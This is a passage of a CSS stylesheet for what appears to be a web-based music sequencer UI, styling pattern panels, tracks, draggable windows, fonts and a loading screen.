	--gsuiPatterns-synth-namehover-color: #7b7;
	--gsuiPatterns-synth-patterns-bg: #0006;
	--gsuiPatterns-synth-dest-bg: #0000001a;
	--gsuiPatterns-synth-placeholder-color: #fff6;
	--gsuiPatterns-synth-placeholder-bg: #0003;

	--gsuiPatterns-pattern-bg: #919CA1;
	--gsuiPatterns-pattern-selected-bg: #5ac;
	--gsuiPatterns-pattern-color: #41BBBF;
	--gsuiPatterns-pattern-selected-color: #223;
	--gsuiPatterns-pattern-head-bg: #0003;
	--gsuiPatterns-pattern-head-selected-bg: #fff3;
	--gsuiPatterns-pattern-dest-bg: #fff1;
}
.gsuiPatterns {
	--gsuiPatterns-pattern-h: 64px;
	--gsuiPatterns-pattern-head-h: 26px;
	--gsuiPatterns-pattern-grip-w: 16px;
	height: 100%;
}

/* .......................................................................... */
.gsuiPatterns-panel {
	--gsuiPanels-bd: 0;
	display: flex;
	flex-direction: column;
}
.gsuiPatterns-panelBuffers,
.gsuiPatterns-panelDrums {
	min-height: 29px;
	max-height: 400px;
	height: 140px;
}

/* .......................................................................... */
.gsuiPatterns-panel-menu {
	display: flex;
	align-items: center;
	height: 28px;
	min-height: 28px;
	padding: 0 6px;
	color: var( --gsuiPatterns-panel-menu-color );
	background-color: var( --gsuiPatterns-panel-menu-bg );
	user-select: none;
}
.gsuiPatterns-panel-icon,
.gsuiPatterns-panel-title {
	font-size: 12px;
	line-height: 1;
	opacity: .5;
}
.gsuiPatterns-panel-icon {
	margin-right: 4px;
}
.gsuiPatterns-panel-title {
	font-size: 12px;
	font-weight: bold;
}
.gsuiPatterns-panel-menu .gsuiPatterns-btnSolid {
	margin-left: 8px;
}

/* .......................................................................... */
.gsuiPatterns-panel-list {
	flex: 1;
	overflow: auto;
	position: relative;
}
.gsuiPatterns-panel-list:empty {
	display: none;
}

/* .......................................................................... */
.gsuiPatterns-destArrow {
	margin: 0 4px;
	font-size: 12px;
	opacity: .7;
	pointer-events: none;
}

/* .......................................................................... */
.gsuiPatterns-btnSolid {
	display: inline-flex;
	align-items: center;
	overflow: hidden;
	height: 20px;
	padding: 0 8px;
	border: 0;
	outline: 0;
	cursor: pointer;
	border-radius: 3px;
	line-height: 1;
	font-size: 12px;
	color: inherit;
	font-family: inherit;
	font-weight: bold;
	text-align: start;
	background-color: var( --gsuiPatterns-panel-btnSolid-bg );
	transition: filter .2s;
}
.gsuiPatterns-btnSolid:focus,
.gsuiPatterns-btnSolid:hover {
	filter: brightness( 1.1 );
}
.gsuiPatterns-btnSolid[ data-action="newSynth" ] { color: var( --gsuiPatterns-newSynthBtn-color ); }
.gsuiPatterns-btnSolid[ data-action="newDrums" ] { color: var( --gsuiPatterns-newDrumsBtn-color ); }
.gsuiPatterns-btnIcon {
	pointer-events: none;
}
.gsuiPatterns-btnText {
	margin-left: 4px;
	overflow: hidden;
	white-space: nowrap;
	text-overflow: ellipsis;
	pointer-events: none;
}

/* .......................................................................... */
.gsuiPatterns-placeholder {
	display: none;
	overflow: hidden;
	flex: 1;
	padding: 0 10px;
	text-align: center;
	align-items: center;
	justify-content: center;
	color: var( --gsuiPatterns-panel-menu-color );
	font-size: 12px;
	font-weight: bold;
	opacity: 0;
	transition: .3s;
	transition-property: opacity;
	user-select: none;
}
.gsuiPatterns-placeholderToCheck .gsuiPatterns-placeholder:only-child,
.gsuiPatterns-placeholderToCheck:empty + .gsuiPatterns-placeholder {
	display: flex;
	opacity: .4;
}
.gsuiPatterns-synth {
	display: flex;
	flex-direction: column;
	color: var( --gsuiPatterns-synth-color );
	border-bottom: 0 solid var( --gsuiPatterns-synth-bg );
	background-color: var( --gsuiPatterns-synth-bg );
	transition: .2s;
	transition-property:
		border-bottom-color,
		background-color,
		filter;
}
.gsuiPatterns-synth-expanded {
	filter: brightness( 1.1 );
	border-bottom-width: 2px;
}
.gsuiPatterns-synth-selected {
	--gsuiPatterns-synth-bg: var( --gsuiPatterns-synth-selected-bg );
	--gsuiPatterns-synth-color: var( --gsuiPatterns-synth-selected-color );
}

/* .......................................................................... */
.gsuiPatterns-synth-head {
	display: flex;
	height: 32px;
	line-height: 32px;
	font-size: 12px;
	user-select: none;
}

/* .......................................................................... */
.gsuiPatterns-synth-btn {
	width: 20px;
	min-width: 20px;
	margin: 0;
	border: 0;
	outline: 0;
	padding: 0;
	opacity: .7;
	color: inherit;
	cursor: pointer;
	background: none;
	font-size: 14px;
	transition: .1s;
	transition-property: background-color, opacity;
}
.gsuiPatterns-synth-btn:focus,
.gsuiPatterns-synth-btn:hover {
	opacity: 1;
}
.gsuiPatterns-synth:not( .gsuiPatterns-synth-selected ) .gsuiPatterns-synth-btn:hover {
	color: var( --gsuiPatterns-synth-namehover-color );
}

/* .......................................................................... */
.gsuiPatterns-synth-expand {
	width: 16px;
	min-width: 16px;
	background-color: var( --gsuiPatterns-synth-expand-bg );
}
.gsuiPatterns-synth-expanded .gsuiPatterns-synth-expand {
	opacity: 1;
}

/* .......................................................................... */
.gsuiPatterns-synth-info {
	flex: 1;
	display: flex;
	overflow: hidden;
	align-items: center;
	padding-left: 6px;
	white-space: nowrap;
	text-overflow: ellipsis;
	font-weight: bold;
}
.gsuiPatterns-synth-name {
	overflow: hidden;
	white-space: nowrap;
	text-overflow: ellipsis;
	pointer-events: none;
}
.gsuiPatterns-synth-name:empty::before {
	content: "Untitled";
	font-style: italic;
	opacity: .8;
}
.gsuiPatterns-synth-dest {
	background-color: var( --gsuiPatterns-synth-dest-bg );
}
.gsuiPatterns-synth-dest:hover,
.gsuiPatterns-synth-dest:focus {
	color: var( --gsuiPatterns-synth-bg );
	background-color: var( --gsuiPatterns-panel-btnSolid-bg );
}

/* .......................................................................... */
.gsuiPatterns-synth-patterns {
	position: relative;
	overflow: hidden;
	min-height: 0;
	max-height: 250px;
	background-color: var( --gsuiPatterns-synth-patterns-bg );
	transition: .3s min-height;
}
.gsuiPatterns-synth-expanded .gsuiPatterns-synth-patterns {
	overflow-y: auto;
	min-height: 32px;
}
.gsuiPatterns-synth .gsuiPatterns-pattern {
	margin-top: calc( var( --gsuiPatterns-pattern-h ) * -1 );
}
.gsuiPatterns-synth-expanded .gsuiPatterns-pattern {
	margin-top: 0;
}

/* .......................................................................... */
.gsuiPatterns-synth .gsuiPatterns-placeholder {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
}
.gsuiPatterns-pattern {
	overflow: hidden;
	position: relative;
	box-sizing: border-box;
	flex-direction: column;
	height: var( --gsuiPatterns-pattern-h );
	color: var( --gsuiPatterns-pattern-color );
	background-color: var( --gsuiPatterns-pattern-bg );
	transition:
		margin-top .3s,
		background-color .1s;
}
.gsuiPatterns-panelBuffers .gsuiPatterns-pattern {
	border-bottom: 2px solid transparent;
}
.gsuiPatterns-pattern-selected {
	--gsuiPatterns-pattern-bg: var( --gsuiPatterns-pattern-selected-bg );
	--gsuiPatterns-pattern-color: var( --gsuiPatterns-pattern-selected-color );
	--gsuiPatterns-pattern-head-bg: var( --gsuiPatterns-pattern-head-selected-bg );
}

/* .......................................................................... */
.gsuiPatterns-pattern-grip {
	position: absolute;
	width: calc( var( --gsuiPatterns-pattern-grip-w ) - 2px );
	top: 0;
	left: 0;
	bottom: 0;
	cursor: grab;
	font-size: 14px;
	text-align: center;
	line-height: var( --gsuiPatterns-pattern-h );
	background-color: var( --gsuiPatterns-pattern-head-bg );
}

/* .......................................................................... */
.gsuiPatterns-pattern-head {
	position: absolute;
	left: var( --gsuiPatterns-pattern-grip-w );
	top: 0;
	right: 0;
	display: flex;
	box-sizing: border-box;
	height: var( --gsuiPatterns-pattern-head-h );
	line-height: var( --gsuiPatterns-pattern-head-h );
	background-color: var( --gsuiPatterns-pattern-head-bg );
	transition: inherit;
}
.gsuiPatterns-pattern-info {
	flex: 1;
	display: flex;
	align-items: center;
	padding: 0 8px;
	overflow: hidden;
}
.gsuiPatterns-pattern-name {
	overflow: hidden;
	white-space: nowrap;
	text-overflow: ellipsis;
	font-size: 12px;
	font-weight: bold;
}
.gsuiPatterns-pattern-name:empty::after {
	content: "Untitled";
	font-style: italic;
	opacity: .5;
}
.gsuiPatterns-pattern-dest {
	background-color: var( --gsuiPatterns-pattern-dest-bg );
}
.gsuiPatterns-pattern-dest:hover,
.gsuiPatterns-pattern-dest:focus {
	color: var( --gsuiPatterns-pattern-bg );
	background-color: var( --gsuiPatterns-pattern-color );
}
.gsuiPatterns-pattern-btn {
	width: 20px;
	border: 0;
	outline: 0;
	padding: 0;
	opacity: .7;
	color: inherit;
	cursor: pointer;
	font-size: 14px;
	background: none;
	transition: .1s opacity;
}
.gsuiPatterns-pattern-btn:focus,
.gsuiPatterns-pattern-btn:hover {
	opacity: 1;
}

/* .......................................................................... */
.gsuiPatterns-pattern-content,
.gsuiPatterns-pattern-placeholder {
	position: absolute;
	top: var( --gsuiPatterns-pattern-head-h );
	left: var( --gsuiPatterns-pattern-grip-w );
	right: 0;
	bottom: 0;
	pointer-events: none;
}
.gsuiPatterns-pattern-content:empty {
	display: none;
}
.gsuiPatterns-pattern-content:empty + .gsuiPatterns-pattern-placeholder {
	display: flex;
}
.gsuiPatterns-pattern-svg {
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
	opacity: .8;
	fill: currentColor;
}
.gsuiPatterns-pattern-placeholder {
	display: none;
	align-items: center;
	font-size: 14px;
	opacity: .5;
}
.gsuiPatterns-pattern-placeholderIcon {
	margin: 0 8px;
}
.gsuiPatterns-pattern-placeholderText {
	overflow: hidden;
	text-overflow: ellipsis;
	white-space: nowrap;
	user-select: none;
}
.gsuiTrack {
	--gsuiTrack-hsl-h: 0;
	--gsuiTrack-hsl-s: 0%;
	--gsuiTrack-hsl-l: 33%;
	--gsuiTrack-color: #fff;
	--gsuiTrack-toggle-bg: #ffa;
	--gsuiTrack-toggleOff-bg: #fff3;
}
.gsuiTrack {
	display: flex;
	height: var( --gsuiTimewindow-lineH );
	background-color: hsl(
		var( --gsuiTrack-hsl-h ),
		var( --gsuiTrack-hsl-s ),
		calc( var( --gsuiTrack-hsl-l ) + var( --rel-l, 0% ) ) );
}
.gsuiTrack,
.gsuiTrack-row,
.gsuiTrack-toggle::before {
	transition: .2s background-color;
}
.gsuiTrack:nth-child( even ) {
	--rel-l: -1.7%;
}
.gsuiTrack.gsui-mute {
	--rel-l: -5%;
	--gsuiTrack-toggle-bg: var( --gsuiTrack-toggleOff-bg );
}
.gsuiTrack.gsui-mute:nth-child( even ) {
	--rel-l: -5.5%;
}

/* .......................................................................... */
.gsuiTrack-row {
	position: relative;
	z-index: 0;
	height: var( --gsuiTimewindow-lineH );
	background-color: rgba( 0, 0, 0, var( --rel-a, 0 ) );
}
.gsuiTrack-row:nth-child( even ) {
	--rel-a: .06;
}
.gsuiTrack-row.gsui-mute {
	--rel-a: .25;
}
.gsuiTrack-row.gsui-mute:nth-child( even ) {
	--rel-a: .29;
}
.gsuiTrack-row > div {
	position: absolute;
	top: 0;
	bottom: 0;
	width: 100%;
	font-size: var( --gsuiTimewindow-pxperbeat );
}

/* .......................................................................... */
.gsuiTrack-toggle {
	cursor: pointer;
	display: flex;
	border: 0;
	outline: 0;
	padding: 0;
	min-width: 24px;
	align-items: center;
	justify-content: center;
	color: var( --gsuiTrack-toggle-bg );
	font-size: 8px;
	background: none;
}
.gsuiTrack-nameWrap {
	position: relative;
	flex: 1;
}
.gsuiTrack-name {
	box-sizing: border-box;
	position: absolute;
	top: 0;
	width: 100%;
	height: 100%;
	border: 0;
	outline: 0;
	padding-right: 10px;
	font-size: 12px;
	font-weight: bold;
	font-family: inherit;
	text-overflow: ellipsis;
	color: var( --gsuiTrack-color );
	cursor: default;
	background: none;
	user-select: none;
}
.gsui-mute .gsuiTrack-name {
	opacity: .5;
}
.gsuiTrack-name:focus {
	font-weight: normal;
}
.gsuiTrack-name::placeholder {
	color: inherit;
	font-style: italic;
	font-weight: normal;
	opacity: .3;
}
.gsuiTrack-name:focus::placeholder {
	color: transparent;
}
.gsuiWindow {
	--gsuiWindow-bg: #444;
	--gsuiWindow-bgImg: url( "data:image/svg+xml,%3Csvg width='6' height='6' viewBox='0 0 6 6' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23000000' fill-opacity='0.2' fill-rule='evenodd'%3E%3Cpath d='M5 0h1L0 6V5zM6 5v1H5z'/%3E%3C/g%3E%3C/svg%3E" );
	--gsuiWindow-color: #222;
	--gsuiWindow-head-bg: #919CA1;
	--gsuiWindow-border-color: #444;
	--gsuiWindow-btn-close-color: #ba5d5d88;
	--gsuiWindow-focused-border-color: #689acb;
}
.gsuiWindows {
	--gsuiWindows-overflow: hidden;
	position: relative;
	overflow: var( --gsuiWindows-overflow );
	scroll-behavior: smooth;
}

.gsuiWindows.gsuiWindows-maximized {
	overflow: hidden;
}
.gsuiWindow {
	--gsuiWindow-radius: 2px;
	--gsuiWindow-head-height: 28px;
	--gsuiWindow-border-width: 2px;
	--gsuiWindow-handler-width: 4px;
	--gsuiWindow-title-opacity: .8;
	position: absolute;
	outline: 0;
	color: var( --gsuiWindow-color );
	border-radius: var( --gsuiWindow-radius );
	transition: .2s;
	transition-property: opacity, visibility;
}
.gsuiWindow:not( .gsuiWindow-show ) {
	opacity: 0;
	visibility: hidden;
	pointer-events: none;
}
.gsuiWindow:focus-within {
	--gsuiWindow-title-opacity: 1;
	--gsuiWindow-border-color: var( --gsuiWindow-focused-border-color );
}
.gsuiWindow-maximized {
	--gsuiWindow-radius: 0;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	overflow: hidden;
}
.gsuiWindow-handlers::before,
.gsuiWindow:not( .gsuiWindow-dragging ),
.gsuiWindows-lowGraphics .gsuiWindow-dragging {
	box-shadow: 0 0 0
		var( --gsuiWindow-border-width )
		var( --gsuiWindow-border-color );
}
/*
// If we want to add some shadow:
.gsuiWindow:not( .gsuiWindow-dragging ):focus-within,
.gsuiWindows-lowGraphics .gsuiWindow.gsuiWindow-dragging:focus-within {
	box-shadow: 0 0 0
		var( --gsuiWindow-border-width )
		var( --gsuiWindow-border-color ),
		0 0 20px #0008;
}
*/

/* .......................................................................... */
.gsuiWindow-handlers {
	position: absolute;
	opacity: 0;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	margin: calc( var( --gsuiWindow-handler-width ) * -1 );
}
.gsuiWindow-handlers::before {
	content: "";
	z-index: 1;
	position: absolute;
	pointer-events: none;
	border-radius: var( --gsuiWindow-radius );
	top: var( --gsuiWindow-handler-width );
	left: var( --gsuiWindow-handler-width );
	right: var( --gsuiWindow-handler-width );
	bottom: var( --gsuiWindow-handler-width );
}
.gsuiWindow-dragging .gsuiWindow-handlers {
	opacity: 1;
}
.gsuiWindow-maximized .gsuiWindow-handlers,
.gsuiWindow-minimized .gsuiWindow-handler {
	display: none;
}
.gsuiWindow-handler {
	position: absolute;
	width: calc( var( --gsuiWindow-handler-width ) * 2 );
	height: calc( var( --gsuiWindow-handler-width ) * 2 );
}
.gsuiWindow-handler[ data-dir="nw" ] { cursor: nw-resize; top: 0; left: 0; }
.gsuiWindow-handler[ data-dir="ne" ] { cursor: ne-resize; top: 0; right: 0; }
.gsuiWindow-handler[ data-dir="sw" ] { cursor: sw-resize; bottom: 0; left: 0; }
.gsuiWindow-handler[ data-dir="se" ] { cursor: se-resize; bottom: 0; right: 0; }
.gsuiWindow-handler[ data-dir="n" ] { cursor: n-resize; top: 0; width: 100%; }
.gsuiWindow-handler[ data-dir="w" ] { cursor: w-resize; left: 0; height: 100%; }
.gsuiWindow-handler[ data-dir="e" ] { cursor: e-resize; right: 0; height: 100%; }
.gsuiWindow-handler[ data-dir="s" ] { cursor: s-resize; bottom: 0; width: 100%; }

/* .......................................................................... */
.gsuiWindow-wrap {
	position: absolute;
	overflow: hidden;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	border-radius: inherit;
}
.gsuiWindow-head {
	display: flex;
	position: absolute;
	top: 0;
	width: 100%;
	font-size: 16px;
	height: var( --gsuiWindow-head-height );
	background-color: var( --gsuiWindow-head-bg );
	user-select: none;
	-webkit-user-select: none;
}
.gsuiWindow-dragging .gsuiWindow-head {
	cursor: move;
}
.gsuiWindow-minimized .gsuiWindow-head {
	border-radius: inherit;
}
.gsuiWindow-content {
	position: absolute;
	overflow: auto;
	width: 100%;
	bottom: 0;
	top: var( --gsuiWindow-head-height );
	background-color: var( --gsuiWindow-bg );
	background-image: var( --gsuiWindow-bgImg );
}
.gsuiWindow-minimized .gsuiWindow-content {
	display: none;
}

/* .......................................................................... */
.gsuiWindow-icon,
.gsuiWindow-title {
	opacity: var( --gsuiWindow-title-opacity );
	transition: .2s opacity;
}
.gsuiWindow-icon {
	border: 0;
	padding: 0;
	outline: 0;
	width: 32px;
	min-width: 32px;
	color: inherit;
	cursor: inherit;
	font-size: 16px;
	background: none;
}
.gsuiWindow-title {
	overflow: hidden;
	white-space: nowrap;
	text-overflow: ellipsis;
	font-size: 12px;
	font-weight: bold;
	line-height: var( --gsuiWindow-head-height );
}
.gsuiWindow-headContent {
	flex: 1;
	display: flex;
	align-items: center;
	padding-left: .5em;
}
.gsuiWindow-headBtns {
	height: 100%;
	display: flex;
	margin-left: auto;
	align-items: center;
}

/* .......................................................................... */
.gsuiWindow-headBtn {
	border: 0;
	padding: 0;
	outline: 0;
	width: var( --gsuiWindow-head-height );
	height: 100%;
	cursor: pointer;
	color: inherit;
	font-size: 14px;
	opacity: .6;
	transition: .2s;
	transition-property: opacity, background-color;
	background: none;
}
.gsuiWindow-headBtn:focus,
.gsuiWindow-headBtn:hover {
	opacity: 1;
	background-color: rgba( 0, 0, 0, .1 );
}
.gsuiWindow-headBtn[ data-icon="close" ]:focus,
.gsuiWindow-headBtn[ data-icon="close" ]:hover {
	background-color: var( --gsuiWindow-btn-close-color );
}
.gsuiWindow-minimized .gsuiWindow-headBtn[ data-icon="minimize" ],
.gsuiWindow-maximized .gsuiWindow-headBtn[ data-icon="maximize" ],
.gsuiWindow:not( .gsuiWindow-minimized ):not( .gsuiWindow-maximized )
.gsuiWindow-headBtn[ data-icon="restore" ] {
	display: none;
}
/* FontAwesome (regular/bold) */
/* .......................................................................... */

@font-face {
	font-family: "FontAwesome";
	font-style: normal;
	font-weight: normal;
	src: url( "../../assets/fonts/fa-duotone-900.woff2" );
}

@font-face {
	font-family: "FontAwesomeBrands";
	font-style: normal;
	font-weight: normal;
	src: url( "../../assets/fonts/fa-brands-400.woff2" );
}

/* Oswald (regular) */
/* .......................................................................... */

@font-face { /* latin */
	font-family: "Oswald";
	font-style: normal;
	font-weight: normal;
	src: local( "Oswald Regular" ), local( "Oswald-Regular" ), url( "../../assets/fonts/oswald-400-latin.woff2" ) format( "woff2" );
	unicode-range: u+0000-00ff, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da, u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215, u+feff, u+fffd;
}

/* Unica One (regular) */
/* .......................................................................... */

@font-face { /* latin */
	font-family: "Unica One";
	font-style: normal;
	font-weight: normal;
	src: local( "Unica One" ), local( "UnicaOne-Regular" ), url( "../../assets/fonts/unica-one-400-latin.woff2" ) format( "woff2" );
	unicode-range: u+0000-00ff, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da, u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215, u+feff, u+fffd;
}

/* Inconsolata (regular) */
/* .......................................................................... */

@font-face { /* latin */
	font-family: "Inconsolata";
	font-style: normal;
	font-weight: normal;
	src: local( "Inconsolata Regular" ), local( "Inconsolata-Regular" ), url( "../../assets/fonts/inconsolata-400-latin.woff2" ) format( "woff2" );
	unicode-range: u+0000-00ff, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da, u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215, u+feff, u+fffd;
}

/* Montserrat (regular) */
/* .......................................................................... */

@font-face { /* cyrillic-ext */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: normal;
	src: local( "Montserrat Medium" ), local( "Montserrat-Medium" ), url( "../../assets/fonts/montserrat-500-cyrillic-ext.woff2" ) format( "woff2" );
	unicode-range: u+0460-052f, u+1c80-1c88, u+20b4, u+2de0-2dff, u+a640-a69f, u+fe2e-fe2f;
}

@font-face { /* cyrillic */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: normal;
	src: local( "Montserrat Medium" ), local( "Montserrat-Medium" ), url( "../../assets/fonts/montserrat-500-cyrillic.woff2" ) format( "woff2" );
	unicode-range: u+0400-045f, u+0490-0491, u+04b0-04b1, u+2116;
}

@font-face { /* vietnamese */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: normal;
	src: local( "Montserrat Medium" ), local( "Montserrat-Medium" ), url( "../../assets/fonts/montserrat-500-vietnamese.woff2" ) format( "woff2" );
	unicode-range: u+0102-0103, u+0110-0111, u+1ea0-1ef9, u+20ab;
}

@font-face { /* latin-ext */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: normal;
	src: local( "Montserrat Medium" ), local( "Montserrat-Medium" ), url( "../../assets/fonts/montserrat-500-latin-ext.woff2" ) format( "woff2" );
	unicode-range: u+0100-024f, u+0259, u+1e00-1eff, u+2020, u+20a0-20ab, u+20ad-20cf, u+2113, u+2c60-2c7f, u+a720-a7ff;
}

@font-face { /* latin */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: normal;
	src: local( "Montserrat Medium" ), local( "Montserrat-Medium" ), url( "../../assets/fonts/montserrat-500-latin.woff2" ) format( "woff2" );
	unicode-range: u+0000-00ff, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da, u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215, u+feff, u+fffd;
}

/* Montserrat (bold) */
/* .......................................................................... */

@font-face { /* cyrillic-ext */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: bold;
	src: local( "Montserrat Bold" ), local( "Montserrat-Bold" ), url( "../../assets/fonts/montserrat-700-cyrillic-ext.woff2" ) format( "woff2" );
	unicode-range: u+0460-052f, u+1c80-1c88, u+20b4, u+2de0-2dff, u+a640-a69f, u+fe2e-fe2f;
}

@font-face { /* cyrillic */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: bold;
	src: local( "Montserrat Bold" ), local( "Montserrat-Bold" ), url( "../../assets/fonts/montserrat-700-cyrillic.woff2" ) format( "woff2" );
	unicode-range: u+0400-045f, u+0490-0491, u+04b0-04b1, u+2116;
}

@font-face { /* vietnamese */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: bold;
	src: local( "Montserrat Bold" ), local( "Montserrat-Bold" ), url( "../../assets/fonts/montserrat-700-vietnamese.woff2" ) format( "woff2" );
	unicode-range: u+0102-0103, u+0110-0111, u+1ea0-1ef9, u+20ab;
}

@font-face { /* latin-ext */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: bold;
	src: local( "Montserrat Bold" ), local( "Montserrat-Bold" ), url( "../../assets/fonts/montserrat-700-latin-ext.woff2" ) format( "woff2" );
	unicode-range: u+0100-024f, u+0259, u+1e00-1eff, u+2020, u+20a0-20ab, u+20ad-20cf, u+2113, u+2c60-2c7f, u+a720-a7ff;
}

@font-face { /* latin */
	font-family: "Montserrat";
	font-style: normal;
	font-weight: bold;
	src: local( "Montserrat Bold" ), local( "Montserrat-Bold" ), url( "../../assets/fonts/montserrat-700-latin.woff2" ) format( "woff2" );
	unicode-range: u+0000-00ff, u+0131, u+0152-0153, u+02bb-02bc, u+02c6, u+02da, u+02dc, u+2000-206f, u+2074, u+20ac, u+2122, u+2191, u+2193, u+2212, u+2215, u+feff, u+fffd;
}
::-webkit-scrollbar { width: 8px; height: 8px; }
::-webkit-scrollbar-track { background-color: #444; }
::-webkit-scrollbar-thumb { background-color: #87DDDD; }

.no-select {
	user-select: none;
	-webkit-user-select: none;
}

html,
body {
	height: 100%;
	margin: 0;
	overflow: hidden;
	font-family: var( --font-default );
	background-color: var( --app-bg );
}

a {
	color: inherit;
	text-decoration: none;
}
.TextGlitch {
	position: relative;
	color: #ccc;
	line-height: 1em;
	font-size: 68px;
	font-family: "oswald", monospace;
}
.TextGlitch-blended {
	color: #fff;
}

.TextGlitch-clip {
	position: relative;
}
.TextGlitch-clip + .TextGlitch-clip {
	position: absolute;
	top: 0;
}
.TextGlitch:not( .TextGlitch-blended ) .TextGlitch-clip + .TextGlitch-clip {
	display: none;
}

.TextGlitch-word {
	margin: 0;
	white-space: nowrap;
}

.TextGlitch-blend {
	position: absolute;
	top: 0;
	opacity: 0;
	transition: .1s;
	transition-property: opacity;
}
.TextGlitch-blendA {
	color: #2af;
	margin: -.03em 0 0 .03em;
	mix-blend-mode: darken;
}
.TextGlitch-blendB {
	color: #f64;
	margin: .03em 0 0 -.03em;
	mix-blend-mode: color-burn;
}
.TextGlitch-blended .TextGlitch-blend {
	opacity: .4;
}
#loading {
	display: flex;
	z-index: 2147483646;
	position: absolute;
	flex-direction: column;
	align-items: center;
	justify-content: center;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	color: #fff8;
	user-select: none;
	-webkit-user-select: none;
	background-image: url("front.jpg");
	transition: .5s opacity;
}
#loading.started {
	pointer-events: none;
	opacity: 0;
}

#loadingContent {
	position: relative;
	pointer-events: none;
	text-align: center;
}

#loadingTitle {
	position: relative;
	font: 52px var( --font-oswald );
}

#loadingLoading,
#loadingLoaded,
#loadingStarting {
	position: absolute;
	left: 0;
	width: 100%;
	opacity: 0;
}
#loading.loaded:not( .starting ) #loadingLoaded {
	animation: 1s loadingTextAnim linear infinite alternate;
}
#loading:not( .loaded ):not( .starting ) #loadingLoading,
#loading.starting #loadingStarting {
	opacity: 1;
}
#gsTitle {
	margin-bottom: 16px;
}

@keyframes loadingTextAnim {
	from { opacity: 0; }
	to { opacity: 1; }
}
:root {
	--app-bg: #222;
	--font-default: "Montserrat", sans-serif;
	--font-monospace: "Inconsolata", "consolas", monospace;
	--font-number: "Unica One", var( --font-monospace );
	--font-oswald: "Oswald", sans-serif;
	--pan-border: 1px solid #333;
	--bpm-fontSize: 22px;

	--gsui-font: var( --font-default );
	--gsui-font-number: var( --font-number );

	--head-bg: #444;
	--head-gap: 4px;
	--head-border: 0;
	--head-heightA: 32px;
	--head-heightB: 24px;
	--head-hover-dur: .2s;
	--head-winBtn-bg: #222;
	--head-winBtn-open-bg: #ff9;

	--head-cmps-btn: #9dabd5;
	--head-dropdown-shadow: 20px 10px #0006;

	--windowBtn-bg: #444;
	--windowBtn-chan-color: #ce93d8;
	--windowBtn-synth-color: #a5d6a7;
	--windowBtn-newCmp-color: #ff9;
	--windowBtn-pattern-color: #81d4fa;

	--ctrl-play-bg: #67a;
	--ctrl-stop-bg: #888;
	--ctrl-play-text: #ddd;
	--ctrl-about-color: #ff9;
	--ctrl-render-color: #ff9;
	--ctrl-eatcookie-color: #ff9;
	--ctrl-currentTime-color: #abd;
	--ctrl-currentTime-bg: #0003;

	--cmp-cloud-bg: #4c71af;
	--cmp-local-bg: #67a;
	--cmp-text: #fff;
	--cmp-height: 42px;
	--cmp-text-size: 18px;
	--cmp-save-bg: #ba5d5d;

	--history-action-bg: #454750;
	--history-action-text: #ddd;
	--history-actionlight-bg: #67a;
	--history-actionlightoff-bg: #1a1a1a;
}
#app {
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	overflow: hidden;
	position: absolute;
	display: flex;
	flex-direction: column;
}

#body {
	flex: 1;
	background-color: var( --app-bg );
	background-image: url( "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='304' height='304' viewBox='0 0 304 304'%3E%3Cpath fill='%23000000' fill-opacity='0.2' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 